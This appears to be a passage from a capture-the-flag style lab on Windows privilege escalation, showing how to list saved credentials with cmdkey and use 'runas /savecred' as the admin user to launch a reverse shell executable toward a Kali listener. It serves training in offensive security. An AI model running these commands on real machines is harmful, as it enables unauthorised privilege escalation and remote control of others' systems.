List any saved credentials:

```
cmdkey /list
```

![[Pasted image 20240528194727.png]]


Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

Answer the questions below

Read and follow along with the above.
